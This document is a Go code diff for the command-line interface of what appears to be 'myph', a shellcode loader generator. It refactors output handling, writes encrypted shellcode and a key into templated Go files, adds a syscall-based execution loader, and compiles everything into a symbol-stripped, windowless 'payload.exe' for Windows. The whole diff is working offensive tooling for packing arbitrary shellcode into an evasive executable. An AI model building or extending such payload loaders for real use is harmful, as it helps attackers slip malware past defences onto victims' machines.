@@ -3,8 +3,10 @@ package cli
 import (
 	"fmt"
 	"os"
+	"os/exec"
 
-    "github.com/cmepw/myph/tools"
+	"github.com/cmepw/myph/loaders"
+	"github.com/cmepw/myph/tools"
 	"github.com/spf13/cobra"
 )
 
@@ -25,7 +27,7 @@ func GetParser(opts *Options) *cobra.Command {
 			}
 
             /* later, we will call "go build" on a golang project, so we need to set up the project tree */
-            err := tools.CreateTmpProjectRoot(opts.Outfile)
+            err := tools.CreateTmpProjectRoot(opts.Outdir)
             if err != nil {
                 fmt.Printf("[!] Error generating project root: %s", err)
                 os.Exit(1)
@@ -78,31 +80,35 @@ func GetParser(opts *Options) *cobra.Command {
             }
 
             /* write decryption routine template */
-            gofile_path := fmt.Sprintf("%s/encrypt.go", opts.Outfile)
-            file, err := os.OpenFile(gofile_path, os.O_TRUNC | os.O_WRONLY, 0644)
+            err = tools.WriteToFile(opts.Outdir, "encrypt.go", template)
             if err != nil {
                 panic(err)
             }
-
-            file.WriteString(template)
-            file.Close()
 
             /* write main execution template */
             encodedShellcode := tools.EncodeForInterpolation(encType, encrypted)
             encodedKey := tools.EncodeForInterpolation(encType, []byte(opts.Key))
-            maingo_path := fmt.Sprintf("%s/main.go", opts.Outfile)
-            file, err = os.OpenFile(maingo_path, os.O_TRUNC | os.O_WRONLY, 0644)
+            err = tools.WriteToFile(opts.Outdir, "main.go", tools.GetMainTemplate(encType.String(), encodedKey, encodedShellcode))
             if err != nil {
                 panic(err)
             }
 
-            file.WriteString(tools.GetMainTemplate(encType.String(), encodedKey, encodedShellcode))
-            file.Close()
-
-            /* TODO: finish this by adding template for each exec method and run compile */
+            /* TODO: add support for more exec templates */
+            err = tools.WriteToFile(opts.Outdir, "exec.go", loaders.GetSyscallTemplate())
 
 			os.Setenv("GOOS", opts.OS)
 			os.Setenv("GOARCH", opts.arch)
+
+            execCmd := exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.exe", "main.go")
+            execCmd.Dir = opts.Outdir
+
+            stdout, stderr := execCmd.Output()
+
+            if string(stdout) == "" {
+                print(stderr)
+                os.Exit(1)
+            }
+
         },
 
 
@@ -110,7 +116,7 @@ func GetParser(opts *Options) *cobra.Command {
 
 	defaults := GetDefaultCLIOptions()
 
-	cmd.PersistentFlags().StringVarP(&opts.Outfile, "outfile", "f", defaults.Outfile, "output filepath")
+	cmd.PersistentFlags().StringVarP(&opts.Outdir, "outdir", "f", defaults.Outdir, "output directory")
 	cmd.PersistentFlags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")
 
 	cmd.PersistentFlags().StringVarP(&opts.arch, "arch", "r", defaults.arch, "architecture compilation target")
